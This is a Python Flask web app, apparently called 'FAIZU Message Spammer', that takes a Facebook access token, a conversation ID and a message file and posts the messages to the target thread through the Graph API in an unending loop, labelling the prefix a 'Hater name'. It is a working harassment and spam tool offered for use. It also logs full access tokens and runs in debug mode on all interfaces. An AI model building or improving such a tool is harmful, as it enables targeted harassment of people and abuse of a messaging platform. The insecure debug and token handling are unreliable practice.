from flask import Flask, request, render_template_string, redirect
import threading
import requests
import time

app = Flask(__name__)
app.debug = True

# Dicts for thread control
active_threads = {}
thread_info = {}

# Function to run spam loop
def message_sender(access_token, thread_id, prefix, delay, messages, thread_key):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'referer': 'https://google.com'
    }

    print(f"\n[🔥 STARTED] Thread ID: {thread_id}")
    print(f"[🔑 TOKEN] {access_token}")
    print(f"[💬 PREFIX] {prefix}")
    print(f"[⏱ DELAY] {delay}s | [📄 MESSAGES] {len(messages)}\n")

    thread_info[thread_key] = {
        'thread_id': thread_id,
        'token': access_token[:25] + '...',
        'prefix': prefix
    }

    while active_threads.get(thread_key, False):
        for msg in messages:
            if not active_threads.get(thread_key, False):
                break
            try:
                message = f"{prefix} {msg}"
                url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                payload = {'access_token': access_token, 'message': message}
                response = requests.post(url, data=payload, headers=headers)

                status = "✅ Sent" if response.status_code == 200 else f"❌ Fail ({response.status_code})"
                print(f"[{status}] {message}")
                time.sleep(delay)
            except Exception as e:
                print(f"[⚠️ ERROR] {e}")
                time.sleep(5)

    print(f"\n[🛑 STOPPED] Thread ID: {thread_id} | Prefix: {prefix}\n")
    active_threads.pop(thread_key, None)
    thread_info.pop(thread_key, None)

# Homepage with form
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        delay = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        thread_key = f"{thread_id}_{access_token[:5]}"
        active_threads[thread_key] = True

        thread = threading.Thread(
            target=message_sender,
            args=(access_token, thread_id, prefix, delay, messages, thread_key)
        )
        thread.daemon = True
        thread.start()

        return redirect('/status')

    return render_template_string(form_html)

# Stop a specific thread
@app.route('/stop/<thread_key>', methods=['POST'])
def stop_thread(thread_key):
    if thread_key in active_threads:
        active_threads[thread_key] = False
    return redirect('/status')

# Status page with stop buttons
@app.route('/status')
def status():
    status_html = '''
    <html><head>
    <title>Status | FAIZU BOT</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
      body {
        background: #0f2027;
        color: white;
        padding: 30px;
        font-family: sans-serif;
      }
      .card {
        background-color: rgba(255,255,255,0.1);
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.3);
      }
      .btn-stop {
        background: red;
        border: none;
        color: white;
        font-weight: bold;
        padding: 5px 15px;
        border-radius: 8px;
      }
    </style>
    </head><body>
    <h2>🟢 Running Bots</h2>
    {% if threads %}
      {% for key, info in threads.items() %}
        <div class="card">
          <p><strong>Thread ID:</strong> {{ info.thread_id }}</p>
          <p><strong>Token:</strong> {{ info.token }}</p>
          <p><strong>Prefix:</strong> {{ info.prefix }}</p>
          <form action="/stop/{{ key }}" method="post">
            <button class="btn-stop" type="submit">🛑 Stop This</button>
          </form>
        </div>
      {% endfor %}
    {% else %}
      <p>No active bots running.</p>
    {% endif %}
    <a href="/" class="btn btn-light mt-3">⬅️ Back to Form</a>
    </body></html>
    '''
    return render_template_string(status_html, threads=thread_info)

# Form UI
form_html = '''
<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="UTF-8" />
  <title>FAIZU TOOL | Loader</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to right, #1f4037, #99f2c8);
      font-family: 'Segoe UI', sans-serif;
      color: white;
    }
    .box {
      max-width: 600px;
      margin: 80px auto;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(255,255,255,0.2);
    }
    .box h2 {
      text-align: center;
      margin-bottom: 30px;
      font-weight: bold;
    }
    .btn-submit {
      background: #00ffae;
      border: none;
      color: black;
      font-weight: bold;
    }
    .btn-submit:hover {
      background: #00ffaa;
      color: white;
    }
    footer {
      text-align: center;
      margin-top: 30px;
      font-size: 14px;
      color: #ccc;
    }
  </style>
</head><body>
  <div class="box">
    <h2>FAIZU | Message Spammer</h2>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Access Token:</label>
        <input type="text" class="form-control" name="accessToken" required />
      </div>
      <div class="mb-3">
        <label>Thread ID (Convo ID):</label>
        <input type="text" class="form-control" name="threadId" required />
      </div>
      <div class="mb-3">
        <label>Prefix Name (e.g., Hater name):</label>
        <input type="text" class="form-control" name="kidx" required />
      </div>
      <div class="mb-3">
        <label>Select Message List (.txt):</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required />
      </div>
      <div class="mb-3">
        <label>Message Delay (in seconds):</label>
        <input type="number" class="form-control" name="time" min="1" required />
      </div>
      <button type="submit" class="btn btn-submit w-100">Start Bot</button>
    </form>
  </div>
  <footer>
    Developed by <strong>Stuner</strong> | All Rights Reserved
  </footer>
</body></html>
'''

# Run Flask server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
